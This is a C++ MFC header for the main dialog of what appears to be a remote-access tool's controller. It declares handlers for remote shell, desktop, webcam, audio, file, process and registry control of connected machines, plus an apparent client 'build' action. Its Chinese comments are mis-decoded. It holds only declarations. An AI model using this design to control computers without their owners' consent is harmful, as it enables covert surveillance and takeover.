
// PCRemoteDlg.h : ͷ�ļ�
//

#pragma once
#include "afxcmn.h"
#include "TrueColorToolBar.h"
#include "include/IOCPServer.h"
// CPCRemoteDlg �Ի���
class CPCRemoteDlg : public CDialogEx
{
// ����
public:
	CPCRemoteDlg(CWnd* pParent = NULL);	// ��׼���캯��

// �Ի�������
	enum { IDD = IDD_PCREMOTE_DIALOG };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV ֧��


// ʵ��
protected:
	HICON m_hIcon;
	CMenu m_MainMemu;				//���Ի����ϲ˵�
	CStatusBar m_StatusBar;			//״̬��
	int iCount;

	CTrueColorToolBar m_ToolBar;
	NOTIFYICONDATA nid;				//����

	// ���ɵ���Ϣӳ�亯��
	virtual BOOL OnInitDialog();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	DECLARE_MESSAGE_MAP()
public:
	CListCtrl m_CList_Online;
	CListCtrl m_CList_Message;
	afx_msg void OnSize(UINT nType, int cx, int cy);
	int InitList(void);
	// add to online list
	void AddList(CString strIP, CString strAddr, CString strPCName, CString strOS, CString strCPU, CString strVideo, CString strPing);
	// show msg
	void ShowMessage(bool bIsOK, CString strMsg);
	//void test(void);
	afx_msg void OnNMRClickOnline(NMHDR *pNMHDR, LRESULT *pResult);
	afx_msg void OnOnlineAudio();
	afx_msg void OnOnlineCmd();
	afx_msg void OnOnlineDesktop();
	afx_msg void OnOnlineFile();
	afx_msg void OnOnlineProcess();
	afx_msg void OnOnlineRegedit();
	afx_msg void OnOnlineServer();
	afx_msg void OnOnlineVideo();
	afx_msg void OnOnlineWindow();
	afx_msg void OnOnlineDelete();
	afx_msg void OnMainAbout();
	afx_msg void OnMainBuild();
	afx_msg void OnMainClose();
	afx_msg void OnMainSet();

	//�Զ�����Ϣ
	// create statusbar
	afx_msg LRESULT OnIconNotify(WPARAM wParam,LPARAM lParam);		//����callback
	afx_msg LRESULT OnAddToList(WPARAM wParam,LPARAM lParam);		//�������client��Ϣ���б�

	void CreateStatusBar(void);
	void CreateToolBar(void);
	afx_msg void OnNotifyClose();
	afx_msg void OnNotifyShow();
	afx_msg void OnClose();

protected:
	void Activate(UINT nPort, UINT nMaxConnections);
	static void CALLBACK NotifyProc(LPVOID lpParam, ClientContext* pContext, UINT nCode);
	static void ProcessReceiveComplete(ClientContext *pContext);
public:
	// ��ʼ����
	void ListenPort(void);
	CString GetOSDisplayString(OSVERSIONINFOEX& OsVerInfoEx);
};
